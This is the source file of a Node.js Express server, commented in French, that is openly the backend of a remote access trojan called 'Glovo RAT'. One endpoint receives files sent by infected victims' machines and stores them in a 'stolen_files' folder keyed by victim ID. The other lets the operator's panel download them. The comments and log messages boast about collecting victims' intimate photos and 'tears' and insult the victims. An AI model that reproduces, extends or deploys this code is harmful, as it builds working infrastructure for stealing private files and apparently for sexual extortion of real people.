const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Dossier où les esclaves envoient leurs nudes et merdes
const STORAGE_DIR = path.join(__dirname, 'stolen_files');
fs.ensureDirSync(STORAGE_DIR);

app.use(cors());
app.use(express.json());

// Config Multer pour upload
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const victimId = req.body.victim_id;
    if (!victimId) return cb(new Error('Pas de victim_id, enculé'));
    
    const victimDir = path.join(STORAGE_DIR, victimId);
    fs.ensureDirSync(victimDir);
    cb(null, victimDir);
  },
  filename: (req, file, cb) => {
    const remotePath = req.body.remote_path || file.originalname;
    const safeName = path.basename(remotePath).replace(/[^a-zA-Z0-9._-]/g, '_');
    cb(null, safeName);
  }
});

const upload = multer({ storage });

// UPLOAD : le client RAT envoie fichier
app.post('/upload', upload.single('file'), (req, res) => {
  const victimId = req.body.victim_id;
  const remotePath = req.body.remote_path;

  if (!victimId || !req.file) {
    return res.status(400).json({ error: 'victim_id ou file manquant' });
  }

  console.log(`[UPLOAD] ${victimId} → ${remotePath} (${req.file.size} octets)`);
  res.status(200).json({ success: true, path: req.file.path });
});

// DOWNLOAD : le panel boss télécharge le fichier volé
app.get('/download', (req, res) => {
  const victimId = req.query.victim_id;
  const filePath = req.query.path;

  if (!victimId || !filePath) {
    return res.status(400).send('victim_id et path obligatoires');
  }

  const fullPath = path.join(STORAGE_DIR, victimId, path.basename(filePath));

  if (!fs.existsSync(fullPath)) {
    return res.status(404).send('Fichier introuvable, la pute l’a supprimé');
  }

  console.log(`[DOWNLOAD] ${victimId} ← ${filePath}`);
  res.download(fullPath, path.basename(filePath), (err) => {
    if (err) {
      res.status(500).send('Erreur download');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Backend Glovo RAT ouvert sur port ${PORT} - Prêt à recevoir des nudes et des pleurs 😈🖕`);
});
